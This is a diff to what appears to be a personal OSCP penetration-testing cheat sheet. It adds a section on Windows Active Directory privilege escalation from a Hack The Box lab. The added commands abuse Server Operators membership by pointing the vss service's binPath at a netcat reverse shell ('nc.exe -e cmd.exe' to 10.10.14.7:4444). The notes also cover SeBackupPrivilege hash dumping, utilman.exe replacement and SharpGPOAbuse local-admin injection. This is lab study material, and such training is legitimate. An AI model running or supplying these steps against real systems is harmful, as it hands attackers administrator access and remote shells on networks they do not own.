@@ -1307,7 +1307,20 @@ Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -Ta
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
 gpupdate /force # Must update the policies after changing
 net user anirudh # Boom user added into local admin group, loginwith impacket-psexec with anirudh user,you will admin privileges 
-``` 
+```
+
+### Server Operator to get Admin svc-printer AD WinPrivEsc
+- I saw that user has [SeBackupPrivilege](SMB getting hash & Windows AD full permission GpoEditDeleteModifySecurity) with i can dump the sam and system files dumped those got admin hash but it's not worked, adding the user to admin group access denied
+- [SeRestorePrivilege](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#serestoreprivilege-escalation-windows) also enabled with this permission replace with cmd with utilman.exe, the rdesktop with use Win+U
+- net user svc-printer is part of **Server Operators** has start the services [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)
+```powershell
+net user svc-printer # Part of Server Operators
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.7 4444" # Return from HTB
+rlwrap nc -lvnp 4444 # Administrator Shell will be live for some time run this again 'sc.exe start vss'
+sc.exe stop vss
+sc.exe start vss
+```
+
 ---
 
 # Web Attacks
